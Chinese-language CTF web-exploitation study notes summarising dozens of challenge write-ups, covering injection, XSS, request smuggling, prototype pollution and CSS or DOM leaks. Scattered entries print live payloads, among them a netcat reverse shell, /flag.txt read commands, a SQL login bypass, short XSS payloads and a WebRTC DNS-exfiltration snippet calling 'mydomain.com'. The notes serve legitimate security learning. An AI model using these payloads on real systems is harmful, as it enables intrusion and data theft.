    - 我一直疑惑为啥这样dom就能取到东西？看了另一篇[wp](https://justinapplegate.me/2023/amactf-sanity/)和[hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)才了解。js里，若有2个html object有相同的id，它们就会被转化成array，然后第二个元素的名字会变成其attribute名称。这种x.y的可以用a标签，如果是x.y.z的就要用form了
- js的fetch的参数可以是data url。如fetch `data:;,{"__proto__":{"sanitize":0}}`会得到`{"__proto__":{"sanitize":0}}`
- 如果用ngrok host网站时得到 `No 'Access-Control-Allow-Origin' header is present on the requested resource.`报错，可以在启动ngrok时加上`--request-header-add "Access-Control-Allow-Origin: *"`选项，或者在网站本身加上`Access-Control-Allow-Origin` header
275. [cps remastered](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/web/cps),[wp](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/cps-remastered)
- insert语句处的sql注入。无错误回显所以无法报错注入爆出信息。但是可以利用LIKE语句从数据库里拿出数据后在注册的用户名处回显
    - 如果有update权限的话甚至可以把flag提取到password字段 https://ireland.re/posts/AmateursCTF/
276. markdown to pdf(md-to-pdf) RCE: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
- 读文件payload：`((require("child_process")).execSync("cat /flag.txt"))`,`((require("fs")).readFileSync("/flag.txt"))`
- 反弹shell payload:`((require("child_process")).execSync("nc ip port -e /bin/sh"))`
- alpine container包含的功能很少，比如没有bash
277. [Node Serialize](https://github.com/luin/serialize/tree/master) rce：https://blog.websecurify.com/2017/02/hacking-node-serialize （从Exploit Setup开始是漏洞详细信息）
278. [Payback](https://discord.com/channels/818117978536017952/1132660345824083978)(wp在discord里，该服务器的邀请链接：https://discord.com/invite/MXdFD6WeTR )
- 若burpsuite访问网站时提示unknown host但普通浏览器可以正常访问，尝试将host写入本地`/etc/hosts`文件
- `.dbshell`：MongoDB client uses it as history file for the MongoDB CLI client
- `/etc/nginx/sites-enabled`为nginx config file所在的文件夹
- 若可以用ssh访问远程机器的一个内网网站，则能利用ssh将其转发。`ssh -L <remote_port>:<local_host>:<local_port>`,如`ssh -L 3000:127.0.0.1:3000`,将远程的3000端口映射到本机的3000端口。 https://www.cnblogs.com/dwtfukgv/articles/12837356.html
- EJS template engine ssti。可用`<%= 2*2 %>`测试，回显4则有ssti
    - 此时可以尝试RCE payload了，不过要是禁止了require的话会比较困难
    - 还能考虑`.env`文件。 The file .env is popular with NodeJS applications, and it's commonly used to store secrets like database credentials and API keys. This file is typically imported using the dotenv module, which parses and store it into the process.env object. 可用`<%= JSON.stringify(process.env) %>`读取
- `mongodb://`开头的url可在命令行用`mongodb mongodb://xxx`访问
279. [idoriot](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/imaginary_23/web/idoriot.md)
- [IDOR](https://portswigger.net/web-security/access-control/idor)漏洞：指攻击者可控制程序用于设定权限的参数。比如`http://xxx.com/?user_id=1`中的user_id用于控制权限，但用户可随意设置，导致提权
280. [Amogus](https://github.com/ixSly/CTFs/blob/master/ImaaginaryCTF/Amogus.md)
- 利用`<object>`进行xs leak.这个技巧在 https://xsleaks.dev/docs/attacks/element-leaks/#when-javascript-cant-be-used 和 https://book.hacktricks.xyz/pentesting-web/xs-search#event-handler-techniques 均有提到
```html
<object data="//example.com">
  <object data="//attacker.com"></object>
</object>
```
若`example.com`返回错误（比如404），就会访问`attacker.com`
- xs leak题目的特征也是有admin bot，且会提供搜索功能。可以拿题目的csp来[网站](https://csp-evaluator.withgoogle.com/)看一眼，缺什么csp就考虑什么样的攻击手段
281. php类型混淆（type juggling）。`"anystring"==0`成立，不同的hash值只需前两个字符都为0e且后续字符只有数字即可被判定为相等。更多参考 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf 和 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
282. [Login](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/login),[wp](https://f0rk3b0mb.github.io/p/imaginaryctf2023/#login)
- 如果sql查询语句有注入漏洞，即使使用php的password_verify也无法阻止这点。参考 https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify
```php
$res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
if (password_verify($password, $res['pwhash'])) //...
```
除了可以在sql语句处爆出数据库内容，还能绕过登录。`' UNION SELECT 'admin' AS username,'fake_hash' AS pwhash--`,利用union伪造一条查询结果。fake_hash为提前计算好的自行输入的任意password
- 形如`$2y$10$C4lfi0f8kouggVBFkKF1ru./NEQTKqptjJCh6JI/hJieELWHLeFXi`是bcrypt hash。bcrypt限制hash内容的长度为72，意味着若hash的内容超过72后，只会取前72个字符进行hash，剩下的就丢掉了。若flag被拼接到可控制的输入后面且会返回hash的结果，可执行oracle攻击获取flag。原理：构造长度为71的任意pad字符串，尾部拼接flag后hash的内容就会携带flag的第一个字符。oracle返回pad+flag[0]的hash，就能拿着这个hash自行爆破，拿到第一个字符。然后pad长度减一，尾部拼接flag后hash的内容就会携带flag的前两个字符。拿到hash后自己拿pad+之前获取到的flag爆破即可。后面的flag以此类推
283. [Sanitized](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized),[题目](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/sanitized),[Sanitized Revenge](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge),[题目](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/sanitized-revenge)
- dompurify默认使用html parser，所以无法正确处理[xhtml](https://www.zhihu.com/question/19783105)文件的dom clobbering（正确设置：`{PARSER_MEDIA_TYPE: 'application/xhtml+xml'}`）。可以用CDATA+`<style>`绕过,得到xss
- 让`<script>`标签插入innerhtml里触发的唯一做法是用`<iframe srcdoc="...">`.xhtml里不能用`<`，还可以用`&lt;`
- html和xhtml对`<!---->`的解析有差异。HTML comment inside script tag is ignored by HTML parser，但xhtml仍会将其视作注释
- xhtml文件可用非ascii字符作tag名来绕过dompurify的html正则检测。这是因为html限制只能用ascii字符，但是xhtml没有这个限制
- 作者说此题的灵感来源： https://jakearchibald.com/2023/against-self-closing-tags-in-html/
284. [Baby Ducky Notes: Revenge](https://ireland.re/posts/TheFewChosen_2023/#baby-ducky-notes-revenge)
- 在python flask中：
```html
<p> {{post.get('content') | safe}} </p>
```
表示flask不会对content的内容进行过滤，意味着可能有xss

285. [Cookie Store](https://ireland.re/posts/TheFewChosen_2023/#cookie-store)
- 若xss题目中bot有提交form的操作，可以尝试污染dom：`<input type="submit" formaction="server"/>`。formaction要比action优先级更高，会将bot导向攻击者的server
286. [gas](../../CTF/moectf/2023/Web/gas.md)
- python requests处理flask session cookie
    - 如何保持post/get时服务器下发的cookie（session.post）
    - 如何解码cookie（requests.utils.dict_from_cookiejar）
287. [出去旅游的心海](../../CTF/moectf/2023/Web/出去旅游的心海.md)
- sql insert/update/delete语句报错注入： https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html
288. [moeworld](../../CTF/moectf/2023/Web/moeworld.md)
- 内网端口扫描工具[fscan](https://github.com/shadow1ng/fscan)使用
- python pymysql模块连接sql数据库以及查询数据
- python使用redis模块连接redis服务器以及利用[redis未授权访问漏洞](https://_thorns.gitbooks.io/sec/content/redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html)
- 使用python paramiko模块连接ssh： https://www.cnblogs.com/wongbingming/articles/12384764.html
289. [Fetch](https://github.com/4rr4y/ctf-writeups/blob/main/2023_LITCTF/Web_Fetch.md)
- js window.XMLHttpRequest拦截器。覆盖window.XMLHttpRequest的open和send来让函数执行额外的逻辑
```html
<html>
    <head>
        <script>window.XMLHttpRequest = class _ { constructor(){};send(a){};open(a,b,c) {let e=document.createElement("iframe");e.src=b;document.body.appendChild(e);}}</script>
    </head>
    <body><h1></h1></body>
</html>
```
```html
<html>
<body>
    <h1 id="h">test</h1>
    <script>
        window.XMLHttpRequest.prototype.open = (...args) => {
            fetch(args[1])
                .then((res) => res.text())
                .then(txt => document.getElementById("h").innerHTML = txt.replace(/(.{10})/g, '$1\n') + "**DONE**")
        }
        window.XMLHttpRequest.prototype.send = () => { }
    </script>
</body>
</html>
```
290. [Art Contest](https://blog.junron.dev/writeups/web/art-contest.html),[wp2](https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/#art-contest)
- python的os.path.splitext函数有特殊情况：路径最后一个部分前面的点号属于root路径的一部分
```py
>>> splitext('.cshrc')
('.cshrc', '')
>>> splitext('/foo/....jpg')
('/foo/....jpg', '')
```
- chrome中，名为html的文件不会被当成html渲染，但名为`.html`的文件会
- 浏览器的沙盒禁止用js读取磁盘上的文件
- 可以用window.open函数开启一个新的页面。虽然通常会被浏览器的弹出窗口拦截器给拦截，但是在诸如Playwright的模拟环境中不会。页面可通过playwright context.pages[index]按开启的顺序取得
- js的history.replaceState函数可以更改一个页面显示的url，但不会影响真正所在的url。比如当前在`a/b`，可改成`a/c`。这样显示的是`a/c`，但实际在`a/b`。只能同源页面下使用，a.com不能改成b.com
- flask路由返回的任何字符串都会被看作是html渲染
- 可以在打开新页面的同时修改其内容
```js
var my = window.open('/x' + e, '_blank' ,"height=600, width=600");
my.onload = function () {
 my.document.body.innerHTML = "winner!!";
};
```
但是仅限打开的页面与当前页面同源

291. [petpet rcbee](https://drt.sh/posts/htb-petpet-rcbee/)
- [Python PIL/Pillow Remote Shell Command Execution via Ghostscript](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)。将一段ghostscript作为图片文件提供给pil，当调用Image.Open时，pil监测到这是个EPS图片，然后利用漏洞在ghostscript里写要执行的命令
292. [Cybergon's Blog](https://learn-cyber.net/writeup/Cybergon's-Blog)
- php session文件包含rce。php session文件通常在默认目录下，且文件的内容用户一般可控制（如记录了username）。如果有文件包含漏洞，将代码放进session文件里再包含即可触发rce
- 有时候session可能不在默认目录下。这种情况尝试`/proc/self/fd/[num]`，有概率访问到session文件
293. `*`
294. `*`
295. [Scanner Service](https://learn-cyber.net/writeup/Scanner-Service)
- ruby的`to_i`函数将字符串转为数字，但是只要字符串以数字开头即可。如`"123abc".to_i`结果为123，不会报错
- nmap参数注入。如果没法注入新的命令，单纯靠nmap的参数也可以rce。参考 https://gtfobins.github.io/gtfobins/nmap/ 和wp（需要公网ip,如果用ngrok转发的话注意过滤，需要把域名转成ip： https://siunam321.github.io/ctf/SekaiCTF-2023/Web/Scanner-Service ）
- shell命令参数除了用`${IFS}`和空格隔开，还能用tab键
296. [Golf Jail](https://blog.antoniusblock.net/posts/golfjail)
- iframe的srcdoc里的内容光用php的`htmlspecialchars`是不够的，因为srcdoc里的代码本身就能适配HTML entities（其他语言的sanitize函数同理，见[Refined Notes](https://github.com/0xM4hm0ud/CTF-Writeups/tree/main/GPN%20CTF%202024/Web/Refined%20Notes) ）。iframe里的csp遵循其parent的csp
- 构造较短的js xss payload。参考 https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail ，一般有3种做法：
```html
<!-- <svg/onload=xxx 也可以 -->
<svg onload=eval(location)> <!-- about:srcdoc（如果在iframe里，这个不能用）-->
<svg onload=eval(top.location)> <!-- http://urlOfThePage/... -->
<svg onload=eval(baseURI)> <!-- http://urlOfThePage/... -->
<svg onload=eval(location.hash)> <!-- 获取http://urlOfThePage/#content 中的#content部分。另外在iframe中这个值为空 -->
```
关于iframe里的payload再补充几句：
```js
//WORKING
document.write("<iframe srcdoc='<script>alert(top.location)</script>'></iframe>")
//NOT WORKING (Blocked by sandbox attribute)
document.write("<iframe sandbox='allow-scripts' srcdoc='<script>alert(top.location)</script>'></iframe>")
//Depends on Cross-Origin-Opener-Policy, 如果设置为same-origin就不能用
document.write("<iframe sandbox='allow-scripts' srcdoc='<script>console.log(top.opener)</script>'></iframe>")
```
单纯eval baseURI会报错，可以参考wp里的闭合做法来执行有效payload
- DNS exfiltration with WebRTC。当csp比较严（但是仍然可以执行代码，如`default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval'`）时，可以利用WebRTC来访问外部资源，绕过CSP
```js
pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:"+ "data_want_to_exfiltrate"+"."+"mydomain.com"]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));
//mydomain.com 可以从 https://app.interactsh.com/#/ 拿一个免费的，用于detect out-of-band DNS interactions
```
wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶payload。注意转为16进制内容可能会很长，而域名的每个label最长63个字符，超过后请求失败。所以需要手动发送多次payload，每次更改截取的索引。
- 如果是借助get传payload，尽量将paylaod base64encdoe。不然浏览器会自动编码特殊字符
- [tiny xss payloads](https://tinyxss.terjanq.me/)
297. [Chunky](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/#challenge-chunky-16-solves)
- 请求走私（[Request Smugling](https://portswigger.net/web-security/request-smuggling)）。也可以参考 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 。简单来说，就是一个服务由多个服务器组成，前端和后端。这些服务器对Content-Length和Transfer-Encoding的处理不一致，导致前端认为是一个request，传给后端就变成了两个。能利用这个走私进去的request进行特殊的攻击
- [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)。有请求走私的情况下可以考虑这个攻击（当然前提是这个服务有cache server）。Cache Poisoning指的是，以某种方法让请求A时服务器返回的内容为有害payload，然后让cache server记住这个内容，以后任何用户访问A时拿到的都是payload。结合请求走私，我们在请求A的后面走私一个请求B，后端服务器会返回A和B的response，但是前端服务器认为自己只请求了A，只读取了A的response。接下来请求C时，B就被返回了，造成请求C获取到的却是B。如果能让server cache这个结果，以后任何人访问C得到的都是B了
- [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing)：有些网站验证JWT token时会请求某个url A获取public key，然后验签。利用cache poisoning，将url A投毒为攻击者自己的公钥即可伪造jwt
298. [The Bidding](https://lkmidas.github.io/posts/20230828-sekaictf2023-writeups)
- Anchor Framework solana（rust） blockchain题目。这题在比赛时被归为pwn，但是我习惯把blockchain相关的放在web
299. [Leakless Note](https://gist.github.com/eskildsen/ec9cecbf2ae567b24f468cea077ddce5)
- 根据[官方文档](http://nginx.org/en/docs/http/ngx_http_headers_module.html)，当nginx配置中add_header处的CSP没有设置always，那么CSP不会被应用于404页面
- 浏览器会限制同时访问一个origin的requests的数量，Chromium中默认是6个平行请求。剩余的会加入队列中
300. [Smooth Jazz](https://www.justinsteven.com/posts/2023/09/10/ductf-2023-smooth-jazz-sqli/)
- 在php中，使用mysql查询会截断ascii值大于等于0x80的字符以及其后面的所有字符
- php vsprintf函数使用
    - 和C的格式化字符串一样，也能用`$1%s`显式获取printf参数。
    ```php
    print_r(vsprintf("%c", array("1337BEEF")));
    //9
    //1337BEEF后的BEEF被截断，只剩下1337.%c将其强制转换为字符，结果为chr(1337 % 256)='9'
    ```
    - 一个比较特殊的技巧。`%1$'>%`本身不是一个格式：
    ```php
    print_r(vsprintf('%1$\'>% %s', ["Hello, world!"]));
    //% Hello, world!
    ```
    但是在`htmlspecialchars($content,ENT_COMPAT | ENT_SUBSTITUTE);`后变为`%1$'&gt;%s`，结果却包含了一个%s：
    ```
    [+] %1$'&g
    %  - start of format string conversion specification
    1$ - argnum    - take from the first item in the values array
    '& - flags     - use the & character as a padding character
    g  - specifier - general format
    [+] t;
    Plain old data
    [+] %s
    A humble %s format string conversion specification
    ```
301. [CGI Fridays](https://learn-cyber.net/writeup/CGI-Fridays)
- perl中`@_`表示传入subroutine(跟函数类似，但是不返回值)的参数所组成的数组
- perl cgi的`CGI::Minimal->param("paramname")`获取网页名为paramname的query（如get传参）的值。当这个值有多个，如`?param=a&param=b`时，会返回全部值所组成的数组
- subroutine不支持传数组作为参数，如果硬要传结果是把数组拆开作为不同的参数。`func(array_size2)`等同于`func(array[0],array[1])`
302. [Breaking Grad](https://d4rkstat1c.medium.com/breaking-grad-hackthebox-write-up-9e780ff2b68b)
- js原型链污染。递归merge（clone）时，除了直接用键名`__proto__`污染，也可以间接使用`constructor`：`{'constructor':{'prototype':{'target_property':'value'}}`
- 原型链污染可以污染`child_process.fork`的options。可以污染NODE_OPTIONS让其读取environ文件，然后污染env为要执行的node js脚本。或者参考 https://y3a.github.io/2021/06/15/htb-breaking-grad/ ，污染execPath和execArgv
303. [Static File Server](https://xhacka.github.io/posts/writeup/2023/09/03/static-file-server)
- 有时候浏览器会标准化url，让路径穿越的payload`../`无法使用。此时可以用curl加上`--path-as-is`选项访问
- Python的aiohttp asynchronous HTTP Client/Server中`web.static('/files', './files', follow_symlinks=True)`无法防止/files处的路径穿越
304. `*`
305. [strapi in](https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/web/strapi-in)
- [strapi-plugin-email-designer](https://github.com/alexzaganelli/strapi-plugin-email-designer) ssti
306. [0day blog](https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/web/0day-blog)
- Drupal core `JSON:API` module cache poisoning。可通过构造恶意url，使admin访问这个url后session cookie会被cache进这个url，以后任意一个普通用户访问这个url就能获取admin的session cookie
307. Mongo ObjectId是可预测的，利用工具： https://github.com/andresriancho/mongo-objectid-predict
308. [Smug-Dino](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/web/smug-dino),[wp](https://github.com/D13David/ctf-writeups/tree/main/csaw23/web/smug_dino)
- nginx 1.17.6请求走私
309. [rainbow-notes](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/web/rainbow-notes)
- 利用dom clobbering使`node.parentElement.removeChild()`报错
- 利用[STTF fragments](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment)和CSS的`:target` selector泄露页面上的内容。参考 https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#styling-scroll-to-text-fragment 。此题的其他参考解法：
    - `<form id="f"><input name="insertBefore">X<style>:target{background:url("")}</style></form>#:~:text=flag{`
    - https://github.com/SuperStormer/writeups/tree/master/csawctf_2023/web/rainbow-notes
310. [SculptAI](https://blog.aravindha.in/winja-ctf-nullcon-goa-2023)
- websocket下的sqlite注入。漏洞点和利用方法都一样，只不过连接方式不同。sqlmap默认不支持websocket，需要借助于工具： https://github.com/BKreisel/sqlmap-websocket-proxy
311. [reCAPTCHA v39](https://github.com/sahuang/my-ctf-challenges/tree/main/vsctf-2023/misc_recaptcha-v39)
- python建立websocket连接+计算图片阴影部分面积。websocket连接的网页用requests是连不上的
- 不知道为啥，在做[kaboot](https://github.com/TJCSec/tjctf-2024-challenges/tree/main/web/kaboot)时websocket库出问题了，没法send（奇了怪了，明明官方也是用这个库的）。于是这里是nodejs做法：**kaboot**
- 好好好，今天又遇见一道websocket题，python和nodejs都不行，疯狂断连。但为啥别人的nodejs就行啊？[Spinner](https://vaktibabat.github.io/posts/vsCTF_Writeups),以及个人的无脑console解法（用js代码触发题目自带的event从而发送socket信息）和其他python解法： **spinner**
312. `*`
313. [Optimized Admin Bot](https://www.youtube.com/watch?v=BRnMRdQJVeo)
- JSDOM在服务器的node context下执行代码，所以获取xss时可以利用spawn等函数直接RCE。当`runScripts`设置为`dangerously`时，有一个小小的沙盒用于执行代码，可以参考wp的做法逃逸： https://gist.github.com/c0nrad/b919aa1c659a4d0f9596f5c6e1aad47f
- [其他做法](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#optimized-admin-bot)包含技巧：
    - 使用node addon
    - 利用XMLHttpRequest从原型链污染到RCE： https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce
    - https://github.com/jsdom/jsdom/issues/2729 (wouldnt work by itself cause require doesnt exist in es6 modules)
314. [Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- 部分项目会使用内部编写的库，但当黑客利用各种方式获取到内部库的名字后，可以提前在各种库管理工具注册同名的公共库。某些工具在库名重复时优先选择版本高的，所以黑客将自己的库版本提高然后往里面放有害代码即可完成RCE
    - 有漏洞风险的工具包括python的pip，nodejs的npm，ruby的gems和[Haskell](https://frasertweedale.github.io/blog-fp/posts/2021-02-12-haskell-dependency-confusion.html)
315. [Dictionary](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/ppc/dictionary)
- GenjiDB sql时间布尔盲注。不过genjidb没有substr等函数，建议用binary search猜测字符串长度及内容
316. [ChadGPT](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/web/chadgpt)
- [GoJay](https://github.com/francoispqt/gojay)与标准`encoding/json`库的解析差异。GoJay解析全部的json字段后，允许在最后加上任意内容（包括注释），但是标准库则会报错
317. [My Secrets](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/web/my-secrets)
- js express links漏洞。links函数用于给response添加[Link header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Link)，Link header本身又等于[<link>](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link)的作用。当用户可以控制传入links的参数时，可以用`>`号闭合当前内容，并添加自己的preload url。可利用这点促使服务器访问自己的webhook
318. [picoblog](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/web/picoblog)
- [rust-rpxy](https://github.com/junkurihara/rust-rpxy)漏洞：
    - 错误的host header实现
    - 缓存功能存在条件竞争。可以同时准备多个request但缺少最后一个字节，然后同时发出最后一个字节
- 若CSP不允许`unsafe-inline`且X-Frame-Options header和CSP frame-ancestors选项都启用，仍然可以利用`<iframe>`+srcdoc绕过
319. [Ohio Instruments 84](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/Ohio_Instruments_84)
- octave --eval命令注入。若攻击者可控制--eval后的参数，可实现getshell等功能。这里列举出读文件的做法（过滤单双引号，分号。但分号可用`\n`代替），要求程序会渲染图表（所以部分解法会把文件内容读到图表名里）: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#ohio-instruments-84
    - https://github.com/luketrenaman/bctf-2023/tree/main/ohio-instruments-84
320. [Text Adventure API](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/Text_Adventure_API)
- pickle反序列化执行系统命令。wp的做法使用`python3 -c`创建HTTPConnection然后read flag，将flag带到自己的服务器上。似乎平时用的[webhook](https://webhook.site)没法连接，但是 https://app.interactsh.com 可以
- https://github.com/goku007xx/CTF-Writeups/tree/main/2023/BuckeyeCTF-2023/test-adventure-api 提供了反弹shell做法（使用ngrok）
321. [area51](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/area51)
- mongodb(nodejs里有个库叫Mongoose,两者的区别参考 https://stackoverflow.com/questions/28712248/difference-between-mongodb-and-mongoose ) nosql注入。以前知道拼接会产生注入，没想到这种代码也会：
```js
//token为用户控制内容
return User.find({
			session: token
		}).then(...)
```
注入方式为利用题目没有检查输入类型的特点，让token为`{"token":{"$regex":"flag.*"}}`，其中session是要获取的值。每次爆破session的一个字符，有回显就继续爆破session的下个字符。也可以参考 https://github.com/goku007xx/CTF-Writeups/tree/main/2023/BuckeyeCTF-2023/area51 使用`^`作为正则
- 更多nosql注入参考 https://book.hacktricks.xyz/pentesting-web/nosql-injection
322. [infinity](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/infinity)
- python socketio库（js socket.io）使用。这个库和普通的socket有些不同
- js做法： https://voxal.dev/blog/inf!
333. [new-management](https://www.youtube.com/watch?v=I-zBSHp9qOc)
- 如何利用remix+metamask与sepolia testnet上的合约进行交互。有意思的地方在于，在这种testnet上可以看到其他人的操作（调用了什么函数，按照时间顺序排序），意味着可以借鉴其他人的做法
334. [certs](https://www.youtube.com/watch?v=I-zBSHp9qOc)
- js jose库[jwtVerify](https://github.com/panva/jose/blob/main/docs/functions/jwt_verify.jwtVerify.md)的错误使用。下面这段代码的try和catch段分别为非对称验证的对称验证的案例：
```js
try {
        const result = await jose.jwtVerify(
        token,
        await jose.importSPKI(publicKey, "RS256") //非对称，签名时用私钥，验证时用公钥
    );
    return result.payload as any;
} catch (e) {
    try {
        const result = await jose.jwtVerify(
        token,
        new TextEncoder().encode(publicKey) //对称，签名时用一个密钥，验证时也用同样的密钥
    );
    return result.payload as any;
    } catch (e) {}
}
```
这个同样也是错误示范。如果源码给出公钥，攻击者就能用公钥签名jwt后走catch分支验证
- 假如服务器没有给公钥，这个[工具](https://github.com/silentsignal/rsa_sign2n)可以从两个签名的token里提取出公钥。不过其结果在末尾会有个换行符，视情况删除。参考Crypto笔记的119条
335. [font-review](https://github.com/cscosu/buckeyectf-2023-public/tree/master/web-font-review),[wp](https://github.com/Nambers/ctf-writeups/tree/main/buckeyeCTF-2023/web-font_review-hard)
- [css injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-i-ligatures-1)。这类题目只允许输入css，要求用某种方法泄露bot所在页面上的flag。此题利用自定义字体（font）[ligatures](https://fonts.google.com/knowledge/glossary/ligature)猜测flag。当页面中的字符溢出时，会报错；反之不会。那么利用某个css匹配flag，若flag匹配则让字体变大导致溢出；反之不会。进而一个字符一个字符猜出完整的flag
- hacktricks里的技巧使用svg font，不过现代浏览器已经不支持了，因此需要使用[fontforge](https://github.com/fontforge/fontforge/tree/master)将svg font转为woff
- 其他做法/参考链接：
    - https://github.com/SuperStormer/writeups/tree/master/buckeyectf_2023/web/font-review
    - https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/
336. [sentiment](https://github.com/cscosu/buckeyectf-2023-public/tree/master/web-sentiment)
- xss+CSRF（with token）without iframes+csp `connect-src 'none'`。具体操作和另一个题目的[wp](https://ctftime.org/writeup/32800)差不多，都是通过操控bot open一个edit tab修改note，note内容为将flag带出的xss payload。发现两者的思路都是将flag使用window.open在另一个窗口打开->edit修改note（flag修改为xss payload，但是打开的那个窗口里还有flag）->访问note，触发xss，将flag窗口里的flag带出。拿出flag常用`document.querySelector`或`querySelectorAll`
- 其他wp： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#sentiment
337. [Web3](https://gist.github.com/YSc21/9be0bb2ce1ed3141e47def6643c19959)
- js ethers库中的[getAddress](https://docs.ethers.org/v5/api/utils/address/#utils-getAddress)可以接受[ICAP格式](https://docs.ethers.org/v5/api/utils/address/#address-icap)的地址。如何获取ICAP地址/签名消息：
```js
const wallet = ethers.Wallet.createRandom();
ethers.getIcapAddress(wallet.address);
signature = await wallet.signMessage(message);
```
338. [0FA](https://github.com/RiuSalvi/CTF_Challenges/tree/main/2023/0FA_balsnctf)
- 伪造[JA3](https://github.com/salesforce/ja3) fingerprint的工具： https://github.com/Danny-Dasilva/CycleTLS 。使用前提是要知道服务器期望的ja3 fingerprint
339. [SaaS](https://github.com/RiuSalvi/CTF_Challenges/tree/main/2023/SaaS_balsnctf)
- [fastify](https://www.npmjs.com/package/fast-json-stringify)模块js SSTI。当程序使用用户提供的schema时，可以在required段注入代码并在登录验证时执行
    - 还可以在`$id`段注入： https://gist.github.com/arkark/32e1a0386360fe5ce7d63e141a74d7b9
340. [1linenginx](https://gist.github.com/arkark/32e1a0386360fe5ce7d63e141a74d7b9)
- nginx/1.16.1 Request Smuggling(请求走私)+xss。其他解法： https://gist.github.com/lebr0nli/dd9c2fef635799865022044817e88956
341. [Ginowa](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023#ginowa)
- sql注入写webshell。不同做法的知识点：
    - 将webshell写到webroot，然后利用这篇[文章](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)里的知识点对那个文件发送http请求触发webshell。原理是当[unc路径](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)中带了一个`@`号后会尝试向路径里指定的文件发送HTTP请求，如sql语法下的`load_file('//localhost@8080/a.php')`，就会向a.php发送HTTP请求
    - 直接向`.htaccess`写内容，在每个php文件开头都添上webshell
    - 利用`LOAD_FILE`+windows短名称（shortname）直接运行名字部分已知的文件：`HEX(LOAD_FILE('C:\\readfl~1.exe'))`
    - dump shell命令（hex）到`sc.bat`
    - 将webshell写到PEAR目录下的config.php
342. [Authy](https://pakcyberbot.github.io/CTF-Writeups/posts/BHME-authy/)
- go语言里的unicode编码
```go
user.Name := "😃" // Contains 1 emoji character
lengthOfString := len(user.Name)            // Length of the string (bytes) - 4 (UTF-8 encoding)。直接求unicode字符的长度是4
lengthOfRuneSlice := len([]rune(user.Name)) // Length of rune slice (code points) - 1。转成go里特有的处理unicode的rune后长度就是1
```
343. `*`
344. `*`
345. `*`
346. `*`
347. [Un Secure](https://berliangabriel.github.io/post/tcp1p-ctf-2023)
- php反序列化漏洞：通过串联多个类获得RCE。这里想提的是php网站里的vendor文件夹和composer.json。可以在composer.json里配置autoload，然后require `vendor/autoload.php`。这样在反序列化/编写文件时会自动包含autoload里提到的类。参考 https://stackoverflow.com/questions/57720711/what-should-i-do-to-using-vendor-folder-located-classes-after-download-via-compo 和 https://getcomposer.org/doc/01-basic-usage.md#autoloading
348. [A Simple Web](https://berliangabriel.github.io/post/tcp1p-ctf-2023)
- 版本小于等于rc12的[Nuxt.js](https://github.com/nuxt/framework)在dev mode运行时有路径穿越漏洞，参考 https://huntr.com/bounties/4849af83-450c-435e-bc0b-71705f5be440 。可用`/_nuxt/@fs/filename`读取任意文件
349. [Latex](https://berliangabriel.github.io/post/tcp1p-ctf-2023)
